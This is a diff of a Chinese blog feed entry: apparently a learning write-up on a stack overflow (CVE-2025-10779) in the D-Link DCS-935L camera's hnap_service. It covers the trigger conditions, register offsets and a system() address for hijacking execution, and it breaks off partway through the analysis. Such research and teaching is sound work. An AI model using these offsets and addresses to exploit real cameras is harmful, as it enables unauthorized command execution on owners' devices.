@@ -14,7 +14,8 @@
         
         <guid>https://th4uma.github.io/post/dcs935l/</guid>
         <description>&lt;img src="https://th4uma.github.io/post/dcs935l/cover.png" alt="Featured image of post CVE-2025-10779 DCS-935L摄像头栈溢出漏洞分析" /&gt;&lt;p&gt;这篇文章主要是参考&lt;a class=&#34;link&#34; href=&#34;https://www.bilibili.com/video/BV19VAUzUEL6/?spm_id_from=333.337.search-card.all.click&amp;amp;vd_source=38b3680952ba912cbee44397df0b531e&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;二进制安全 摄像头0day漏洞挖掘入门第一课_哔哩哔哩_bilibili&lt;/a&gt;进行学习，在这个过程中纪录的学习笔记&lt;/p&gt;
+    &gt;二进制安全 摄像头0day漏洞挖掘入门第一课_哔哩哔哩_bilibili&lt;/a&gt;进行学习时记录的笔记，同时参考&lt;a class=&#34;link&#34; href=&#34;https://bbs.kanxue.com/thread-290519.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;D-Link 摄像头栈溢出漏洞复现-IoT安全-看雪安全社区&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;初步分析&#34;&gt;初步分析
 &lt;/h2&gt;&lt;blockquote&gt;
 &lt;p&gt;找漏洞之前首先要通过&lt;a class=&#34;link&#34; href=&#34;https://fofa.so/?locale=zh-CN&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -32,9 +33,9 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;得到一个文件夹，其中包含如下文件，固件分析一般在&lt;code&gt;squashfs-root&lt;/code&gt;下进行&lt;/p&gt;
 &lt;img src=&#34;1.png&#34; style=&#34;width: 70%;&#34; /&gt;
-&lt;p&gt;下一步需要查找web服务相关的程序，关键词如&lt;code&gt;html&lt;/code&gt;、&lt;code&gt;.php&lt;/code&gt;、&lt;code&gt;.aspx&lt;/code&gt;、&lt;code&gt;favicon.icon&lt;/code&gt;、&lt;code&gt;web&lt;/code&gt;、&lt;code&gt;http&lt;/code&gt;等和web相关的关键词。这里查到有一个名称是&lt;code&gt;web&lt;/code&gt;的文件夹，里面有&lt;code&gt;favicon.ico&lt;/code&gt;和一些&lt;code&gt;.asp&lt;/code&gt;文件，推测这就是目标文件夹&lt;/p&gt;
+&lt;p&gt;下一步需要查找web服务相关的程序，关键词如&lt;code&gt;html&lt;/code&gt;、&lt;code&gt;.php&lt;/code&gt;、&lt;code&gt;.aspx&lt;/code&gt;、&lt;code&gt;favicon.ico&lt;/code&gt;、&lt;code&gt;web&lt;/code&gt;、&lt;code&gt;http&lt;/code&gt;等和&lt;code&gt;web&lt;/code&gt;相关的关键词。这里查到有一个名称是&lt;code&gt;web&lt;/code&gt;的文件夹，里面有&lt;code&gt;favicon.ico&lt;/code&gt;和一些&lt;code&gt;.asp&lt;/code&gt;文件，推测这就是目标文件夹&lt;/p&gt;
 &lt;img src=&#34;2.png&#34; style=&#34;width: 70%;&#34; /&gt;
-&lt;p&gt;&lt;code&gt;web&lt;/code&gt;目录下有一个&lt;code&gt;httpd&lt;/code&gt;文件，以&lt;code&gt;d&lt;/code&gt;为后缀说明这是&lt;code&gt;http&lt;/code&gt;服务的服务端。还有一个文件夹名称是&lt;code&gt;cgi_bin&lt;/code&gt;，推测设备采用的是&lt;code&gt;cgi&lt;/code&gt;协议。&lt;code&gt;cgi&lt;/code&gt;的特点就是将用户传入的参数设置为环境变量，然后用&lt;code&gt;getenv()&lt;/code&gt;来获取环境变量&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;web&lt;/code&gt;目录下有一个&lt;code&gt;httpd&lt;/code&gt;文件，以&lt;code&gt;d&lt;/code&gt;为后缀说明这是&lt;code&gt;http&lt;/code&gt;服务的服务端。还有一个文件夹名称是&lt;code&gt;cgi-bin&lt;/code&gt;，推测设备采用的是&lt;code&gt;cgi&lt;/code&gt;协议。&lt;code&gt;cgi&lt;/code&gt;的特点就是将用户传入的参数设置为环境变量，然后用&lt;code&gt;getenv()&lt;/code&gt;来获取环境变量&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;cgi-bin&lt;/code&gt;中可以看到&lt;code&gt;hnap&lt;/code&gt;文件夹，&lt;code&gt;hnap&lt;/code&gt;是一个D-Link、TP-Link等厂商设备中常见的Web协议。文件夹中包含&lt;code&gt;hnap_service&lt;/code&gt;，这就是这次的分析目标&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;一般情况在分析这类小型固件时，由于文件数量较少且逆向方便，可以逐个程序进行分析&lt;/p&gt;
@@ -49,7 +50,7 @@
 &lt;blockquote&gt;
 &lt;p&gt;&lt;code&gt;strcpy(a,b)&lt;/code&gt;意思就是用&lt;code&gt;strcpy&lt;/code&gt;函数将&lt;code&gt;b&lt;/code&gt;的内容复制到&lt;code&gt;a&lt;/code&gt;中。因此在&lt;code&gt;strcpy(栈上有限字符串,用户输入)&lt;/code&gt;中，如果用户输入字符串的长度超过栈可容纳上限，超出部分也一同被复制，这就导致了溢出&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;挨个查看调用，通过伪代码寻找有可能出现栈溢出的位置。注意到&lt;code&gt;sub_402280&lt;/code&gt;函数中有这样的一句&lt;code&gt;strcpy(v28, v12);&lt;/code&gt;，查看定义&lt;code&gt;char v28[256]; // [sp+64h] [-40Ch] BYREF&lt;/code&gt;，&lt;code&gt;v12 = getenv(&amp;quot;HNAP_AUTH&amp;quot;);&lt;/code&gt;，分别是256字节大小的字符串和用户输入，刚好符合栈溢出可能产生的条件。这时如果&lt;code&gt;HNAP_AUTH&lt;/code&gt;大于了&lt;code&gt;256&lt;/code&gt;字节，就会产生溢出&lt;/p&gt;
+&lt;p&gt;挨个查看调用，通过伪代码寻找有可能出现栈溢出的位置。注意到&lt;code&gt;sub_402280&lt;/code&gt;函数中有这样的一句&lt;code&gt;strcpy(v28, v12);&lt;/code&gt;，查看定义&lt;code&gt;char v28[256]; // [sp+64h] [-40Ch] BYREF&lt;/code&gt;，&lt;code&gt;v12 = getenv(&amp;quot;HNAP_AUTH&amp;quot;);&lt;/code&gt;，分别是256字节大小的字符串和用户输入，刚好符合栈溢出可能产生的条件。这时如果&lt;code&gt;HNAP_AUTH&lt;/code&gt;大等于&lt;code&gt;256&lt;/code&gt;字节，就会产生溢出&lt;/p&gt;
 &lt;img src=&#34;6.png&#34; style=&#34;width: 70%;&#34; /&gt;
 &lt;p&gt;发现溢出点后，可以对其进行标记，也就是将本地变量名改成便于识别的形式，右键重命名。我这里分别改了函数名和记录用户输入的变量名&lt;/p&gt;
 &lt;img src=&#34;7.png&#34; style=&#34;width: 60%;&#34; /&gt;
@@ -96,7 +97,7 @@
 &lt;li&gt;&lt;code&gt;SOAP_ACTION=&amp;quot;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;atoi(CONTENT_LENGTH)&amp;lt;0x20000&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;COOKIE=&amp;quot;uid=&amp;quot;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;HNAP_AUTH=&amp;quot;超出256字节的字符串&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HNAP_AUTH=&amp;quot;大等于256字节的字符串&amp;quot;&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id=&#34;动态调试&#34;&gt;动态调试
 &lt;/h2&gt;&lt;h3 id=&#34;初步调试&#34;&gt;初步调试
@@ -162,7 +163,7 @@
 &lt;img src=&#34;13.png&#34; style=&#34;width: 90%;&#34; /&gt;
 &lt;p&gt;打开&lt;code&gt;ida&lt;/code&gt;，选择&lt;code&gt;debugger&lt;/code&gt;开启&lt;code&gt;gdb&lt;/code&gt;调试，然后选择&lt;code&gt;process options&lt;/code&gt;，填入刚刚的&lt;code&gt;ip&lt;/code&gt;和端口&lt;/p&gt;
 &lt;img src=&#34;14.png&#34; style=&#34;width: 50%;&#34; /&gt;
-&lt;img src=&#34;24.png&#34; style=&#34;width: 50%;&#34; /&gt;
+&lt;img src=&#34;24.png&#34; style=&#34;width: 80%;&#34; /&gt;
 &lt;p&gt;按&lt;code&gt;f9&lt;/code&gt;运行，确认弹窗后来到这个界面说明成功接入调试器&lt;/p&gt;
 &lt;img src=&#34;15.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;p&gt;我先前在程序中打过断点，进入后按一次&lt;code&gt;f9&lt;/code&gt;，程序执行后停在第一个断点处，然后按&lt;code&gt;f5&lt;/code&gt;就可以查看伪代码，暗紫色就是程序停住的地方，分析完一句便按&lt;code&gt;f9&lt;/code&gt;继续&lt;/p&gt;
@@ -240,17 +241,17 @@
 &lt;img src=&#34;19.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;p&gt;最终来到&lt;code&gt;strcpy(v28, DANGER_IVAR);&lt;/code&gt;，成功产生了栈溢出&lt;/p&gt;
 &lt;img src=&#34;21.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;h3 id=&#34;错误修正&#34;&gt;错误修正
+&lt;h3 id=&#34;分割错误修正&#34;&gt;分割错误修正
 &lt;/h3&gt;&lt;p&gt;这里注意到产生溢出后继续执行，会产生报错，指向&lt;code&gt;2B43D76C&lt;/code&gt;&lt;/p&gt;
 &lt;img src=&#34;23.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;在溢出这一句之后有&lt;code&gt;v19 = strtok(v28, &amp;quot; &amp;quot;);&lt;/code&gt;，也就是将字符串以空格分割，字符串中原本是空格的第一个位置会被替换成&lt;code&gt;/x00&lt;/code&gt;，然后将前半部分的内容赋值给&lt;code&gt;v19&lt;/code&gt;。后面还有&lt;code&gt;v20 = strtok(0, &amp;quot; &amp;quot;);&lt;/code&gt;，也就是接着上一句的位置再分割一次，将后半部分的内容赋值给&lt;code&gt;v20&lt;/code&gt;。为了防止报错，实现时应该在&lt;code&gt;HNAP_AUTH&lt;/code&gt;的值中加上一个空格&lt;/p&gt;
+&lt;p&gt;在溢出这一句之后有&lt;code&gt;v19 = strtok(v28, &amp;quot; &amp;quot;);&lt;/code&gt;，也就是将字符串以空格分割，字符串中原本是空格的第一个位置会被替换成&lt;code&gt;\x00&lt;/code&gt;，然后将前半部分的内容赋值给&lt;code&gt;v19&lt;/code&gt;。后面还有&lt;code&gt;v20 = strtok(0, &amp;quot; &amp;quot;);&lt;/code&gt;，也就是接着上一句的位置再分割一次，将后半部分的内容赋值给&lt;code&gt;v20&lt;/code&gt;。为了防止报错，实现时应该在&lt;code&gt;HNAP_AUTH&lt;/code&gt;的值中加上一个空格&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;因此最终确认产生溢出，并保证程序正常执行需要如下条件成立&lt;/strong&gt;：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;REQUEST_METHOD=&amp;quot;POST&amp;quot;&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;SOAP_ACTION=&amp;quot;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;CONTENT_LENGTH=&amp;quot;$(wc -c &amp;lt; /stdin.txt)&amp;quot;&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;COOKIE=&amp;quot;uid=&amp;quot;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;HNAP_AUTH=超过256字节大小的字符串，其中包含一个空格&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HNAP_AUTH=大等于256字节大小的字符串，其中包含一个空格&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;固件根目录下存在&lt;code&gt;/tmp&lt;/code&gt;目录&lt;/li&gt;
 &lt;li&gt;固件根目录下有&lt;code&gt;stdin.txt&lt;/code&gt;，里面写入构造的xml&lt;/li&gt;
 &lt;/ul&gt;
@@ -270,8 +271,8 @@
 &lt;p&gt;假如向原本预留了&lt;code&gt;40&lt;/code&gt;字节的变量中存入&lt;code&gt;100&lt;/code&gt;字节的值，那么在预留内存满后，多出来的部分会继续向高地址存储，最终覆盖最初存储的返回地址。继续往下执行到&lt;code&gt;return&lt;/code&gt;后，它会取到错误的地址并赋值给&lt;code&gt;ip&lt;/code&gt;寄存器，这个地址可能指向错误的位置，更可能在内存中不存在，程序就会直接崩溃&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;栈溢出的利用&lt;/strong&gt;：&lt;/p&gt;
 &lt;p&gt;如果在溢出的输入中夹杂一个地址，让这个地址正好覆盖在返回地址的位置，而地址指向的是某个后门函数，那么函数返回后，程序执行流被劫持到后门函数，就会导致非法执行&lt;/p&gt;
-&lt;h3 id=&#34;控制ra寄存器&#34;&gt;控制RA寄存器
-&lt;/h3&gt;&lt;p&gt;之前将&lt;code&gt;HNAP_AUTH&lt;/code&gt;的值设定为多个&lt;code&gt;a&lt;/code&gt;，那么溢出后的返回地址也会变成4个a的十六进制，这样便无法找到&lt;code&gt;HNAP_AUTH&lt;/code&gt;中具体第几个字符覆盖了返回地址。因此这里需要采用&lt;code&gt;cyclic&lt;/code&gt;字符串，也就是一种每四个字节都独一无二的字符串。然后通过获取返回地址的十六进制，在&lt;code&gt;cyclic&lt;/code&gt;字符串中找到对应的四个字符，从而获取所需位置&lt;/p&gt;
+&lt;h3 id=&#34;计算ra寄存器偏移&#34;&gt;计算RA寄存器偏移
+&lt;/h3&gt;&lt;p&gt;之前将&lt;code&gt;HNAP_AUTH&lt;/code&gt;的值设定为多个&lt;code&gt;a&lt;/code&gt;，那么溢出后的返回地址也会变成4个&lt;code&gt;a&lt;/code&gt;的十六进制，这样便无法找到&lt;code&gt;HNAP_AUTH&lt;/code&gt;中具体第几个字符覆盖了返回地址。因此这里需要采用&lt;code&gt;cyclic&lt;/code&gt;字符串，也就是一种每四个字节都独一无二的字符串。然后通过获取返回地址的十六进制，在&lt;code&gt;cyclic&lt;/code&gt;字符串中找到对应的四个字符，从而获取所需位置&lt;/p&gt;
 &lt;p&gt;由于命令行无法处理部分特殊字符，这一步采用&lt;code&gt;python&lt;/code&gt;来实现&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -337,24 +338,24 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;进入&lt;code&gt;main&lt;/code&gt;函数，关联伪代码与汇编，首先打开汇编&lt;code&gt;IDA View-A&lt;/code&gt;与伪代码&lt;code&gt;Pseudocode-A&lt;/code&gt;，拖动成主界面的两栏，在&lt;code&gt;Pseudocode-A&lt;/code&gt;中左键并如图选择关联，就会发现伪代码成功与汇编对应&lt;/p&gt;
-&lt;img src=&#34;27.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;既然控制的是返回值，&lt;code&gt;return&lt;/code&gt;的时候&lt;code&gt;ra&lt;/code&gt;与&lt;code&gt;pc&lt;/code&gt;寄存器会产生变化，这里便重点分析&lt;code&gt;return&lt;/code&gt;语句，在&lt;code&gt;ra&lt;/code&gt;寄存器的汇编处打几个断点&lt;/p&gt;
-&lt;img src=&#34;28.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;运行程序后进行调试，可以程序由于&lt;code&gt;6A61616C&lt;/code&gt;地址非法而报错，&lt;/p&gt;
-&lt;img src=&#34;25.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;/div&gt;&lt;p&gt;进入&lt;code&gt;main&lt;/code&gt;函数，关联伪代码与汇编，首先打开汇编&lt;code&gt;IDA View-A&lt;/code&gt;与伪代码&lt;code&gt;Pseudocode-A&lt;/code&gt;，拖动成主界面的两栏，在&lt;code&gt;Pseudocode-A&lt;/code&gt;中左键并如图选择关联，就能将伪代码与汇编对应&lt;/p&gt;
+&lt;img src=&#34;27.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;&lt;code&gt;return&lt;/code&gt;的时候&lt;code&gt;ra&lt;/code&gt;与&lt;code&gt;pc&lt;/code&gt;寄存器会产生变化，这里便重点分析&lt;code&gt;return&lt;/code&gt;语句，在&lt;code&gt;ra&lt;/code&gt;寄存器的汇编处打几个断点&lt;/p&gt;
+&lt;img src=&#34;28.png&#34; style=&#34;width: 100%;&#34; /&gt;
+&lt;p&gt;运行程序后进行调试，可以看到程序由于&lt;code&gt;6A61616C&lt;/code&gt;地址非法而报错，&lt;/p&gt;
+&lt;img src=&#34;25.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;p&gt;右上角&lt;code&gt;general registers&lt;/code&gt;中也能看到&lt;code&gt;ra&lt;/code&gt;和&lt;code&gt;pc&lt;/code&gt;寄存器都变成了&lt;code&gt;6A61616C&lt;/code&gt;&lt;/p&gt;
-&lt;img src=&#34;29.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;这个十六进制转成字符串也就是&lt;code&gt;jaal&lt;/code&gt;，在&lt;code&gt;HNAP_AUTH&lt;/code&gt;中定位，得知是在第&lt;code&gt;1137&lt;/code&gt;字节，&lt;/p&gt;
-&lt;img src=&#34;26.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;为了进行验证，我这里将&lt;code&gt;jaal&lt;/code&gt;的部分替换成了&lt;code&gt;t4t4&lt;/code&gt;并修改程序，重新进行调试后，发现寄存器的值果然变成了&lt;code&gt;0x74347434&lt;/code&gt;，也就是说这时我们已经可以控制返回地址，将目标地址放在第&lt;code&gt;1137&lt;/code&gt;到&lt;code&gt;1140&lt;/code&gt;字节就可以劫持程序执行流&lt;/p&gt;
-&lt;img src=&#34;30.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;h3 id=&#34;ra劫持目标&#34;&gt;ra劫持目标
+&lt;img src=&#34;29.png&#34; style=&#34;width: 40%;&#34; /&gt;
+&lt;p&gt;这个十六进制转成字符串也就是&lt;code&gt;jaal&lt;/code&gt;，在&lt;code&gt;HNAP_AUTH&lt;/code&gt;中定位，得知是在第&lt;code&gt;1137&lt;/code&gt;字节&lt;/p&gt;
+&lt;img src=&#34;26.png&#34; style=&#34;width: 100%;&#34; /&gt;
+&lt;p&gt;为了进行验证，我将&lt;code&gt;jaal&lt;/code&gt;的部分替换成了&lt;code&gt;t4t4&lt;/code&gt;并重新进行调试，发现寄存器的值果然变成了&lt;code&gt;0x74347434&lt;/code&gt;，也就是说这时已经可以控制返回地址，将目标地址放在第&lt;code&gt;1137&lt;/code&gt;到&lt;code&gt;1140&lt;/code&gt;字节就可以劫持程序执行流&lt;/p&gt;
+&lt;img src=&#34;30.png&#34; style=&#34;width: 40%;&#34; /&gt;
+&lt;h3 id=&#34;ra劫持目标&#34;&gt;RA劫持目标
 &lt;/h3&gt;&lt;blockquote&gt;
-&lt;p&gt;成功控制&lt;code&gt;ra&lt;/code&gt;寄存器后，如果我们能将程序执行流劫持到&lt;code&gt;system()&lt;/code&gt;函数，然后修改&lt;code&gt;a0&lt;/code&gt;寄存器的值，便可以执行任意指令&lt;/p&gt;
+&lt;p&gt;成功控制&lt;code&gt;ra&lt;/code&gt;寄存器后，如果能将程序执行流劫持到&lt;code&gt;system()&lt;/code&gt;函数，然后修改&lt;code&gt;a0&lt;/code&gt;寄存器的值，便可以执行任意指令&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;为了不打乱程序的执行流，首先尝试在&lt;code&gt;main&lt;/code&gt;函数中寻找&lt;code&gt;system()&lt;/code&gt;，可以看到&lt;code&gt;system(&amp;amp;v32);&lt;/code&gt;这一句可以进行控制，记录它对应汇编开头的地址&lt;code&gt;0x004033E8&lt;/code&gt;&lt;/p&gt;
-&lt;img src=&#34;31.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;img src=&#34;31.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -366,25 +367,122 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;lw&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x202F8&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;var_202D8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;恢复&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gp寄存器&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，类似于初始化&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;la&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;把&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system的函数地址加载到t9寄存器&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;jalr&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t9&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;跳转到&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t9寄存器保存的地址&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，也就是间接调用&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;move&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s0&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;# command //把s0寄存器的值复制到a0寄存器，也就是system的command参数&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;move&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s0&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;把&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s0寄存器的值复制到a0寄存器&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，也就是&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system的command参数&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;code&gt;mips&lt;/code&gt;中有延迟槽机制，也就是在分支或跳转，如&lt;code&gt;jalr&lt;/code&gt;与&lt;code&gt;jr&lt;/code&gt;指令后一句的指令，无论分支是否发生，这条指令都必然执行，也就是&lt;code&gt;move    $a0, $s0&lt;/code&gt;的执行顺序在&lt;code&gt;jalr    $t9 ; system&lt;/code&gt;之前。也就是说，目标变成了控制&lt;code&gt;s0&lt;/code&gt;寄存器，并让&lt;code&gt;s0&lt;/code&gt;寄存器指向我们想作为命令执行的字符串&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;mips&lt;/code&gt;中有延迟槽机制，也就是位于分支或跳转指令，如&lt;code&gt;jalr&lt;/code&gt;与&lt;code&gt;jr&lt;/code&gt;指令后一句的指令，无论分支是否发生，这条指令都必然执行，也就是&lt;code&gt;move    $a0, $s0&lt;/code&gt;的执行顺序在&lt;code&gt;jalr    $t9 ; system&lt;/code&gt;之前。这时目标就变成了控制&lt;code&gt;s0&lt;/code&gt;寄存器，并让&lt;code&gt;s0&lt;/code&gt;寄存器指向想作为命令执行的字符串&lt;/p&gt;
 &lt;h3 id=&#34;控制并劫持s0寄存器&#34;&gt;控制并劫持S0寄存器
-&lt;/h3&gt;&lt;p&gt;&lt;code&gt;s0&lt;/code&gt;寄存器也可以通过溢出来控制。重新进行调试，发现&lt;code&gt;s0&lt;/code&gt;寄存器对应&lt;code&gt;0x7A61616C&lt;/code&gt;，也就是&lt;code&gt;zaal&lt;/code&gt;，位于第1101到第1102字节处&lt;/p&gt;
-&lt;img src=&#34;32.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;关于需要指向的命令字符串，可以通过环境变量与用户输入来传入。它必须保存在不会改变的内存地址中，才能被我们直接命中，但这个程序为了安全性采用了栈随机，每次程序运行时栈的起始地址都不同，这就导致环境变量的地址会无法命中&lt;/p&gt;
-&lt;p&gt;为了验证用户输入是不是保存在固定的内存空间，这里将&lt;code&gt;soap_body&lt;/code&gt;的子节点与文本改成特殊标记值&lt;code&gt;&amp;lt;soap:Body&amp;gt;&amp;lt;MARKTAG&amp;gt;MARKTEXT&amp;lt;/MARKTAG&amp;gt;&amp;lt;/soap:Body&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;启动调试后让程序运行到返回处并停在这里，然后选择&lt;code&gt;search&amp;gt;sequence of bytes&lt;/code&gt;，填入字符串的&lt;code&gt;hex&lt;/code&gt;值，也就是&lt;code&gt;ascll&lt;/code&gt;码的十六进制进行搜索&lt;/p&gt;
-&lt;img src=&#34;33.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;成功搜索到&lt;code&gt;MARKTEXT&lt;/code&gt;，地址0x00431240&lt;/p&gt;
-&lt;img src=&#34;34.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;s0&lt;/code&gt;寄存器也可以通过溢出来控制。重新进行调试，发现它对应&lt;code&gt;0x7A61616C&lt;/code&gt;，也就是&lt;code&gt;zaal&lt;/code&gt;，位于第&lt;code&gt;1101&lt;/code&gt;到第&lt;code&gt;1104&lt;/code&gt;字节处&lt;/p&gt;
+&lt;img src=&#34;32.png&#34; style=&#34;width: 60%;&#34; /&gt;
+&lt;p&gt;关于目标的命令字符串，可以通过环境变量与标准输入来传入。它必须保存在不会改变的内存地址中，才能被直接命中，但当前环境采用了栈随机，每次程序运行时栈的起始地址都不同，这就导致通过环境变量传入的地址会无法命中&lt;/p&gt;
+&lt;p&gt;为了验证标准输入是不是保存在固定的内存空间，这里将&lt;code&gt;soap_body&lt;/code&gt;的子节点与文本改成特殊标记值&lt;code&gt;&amp;lt;soap:Body&amp;gt;&amp;lt;MARKTAG&amp;gt;MARKTEXT&amp;lt;/MARKTAG&amp;gt;&amp;lt;/soap:Body&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;启动调试后让程序运行到返回处并停在这里，然后选择&lt;code&gt;search&amp;gt;sequence of bytes&lt;/code&gt;，填入字符串的&lt;code&gt;hex&lt;/code&gt;值，也就是&lt;code&gt;ascii&lt;/code&gt;码的十六进制进行搜索&lt;/p&gt;
+&lt;img src=&#34;33.png&#34; style=&#34;width: 50%;&#34; /&gt;
+&lt;p&gt;成功搜索到&lt;code&gt;MARKTEXT&lt;/code&gt;，地址&lt;code&gt;0x00431240&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;34.png&#34; style=&#34;width: 40%;&#34; /&gt;
 &lt;p&gt;为了确认这个地址的类型，这里打开程序段界面&lt;/p&gt;
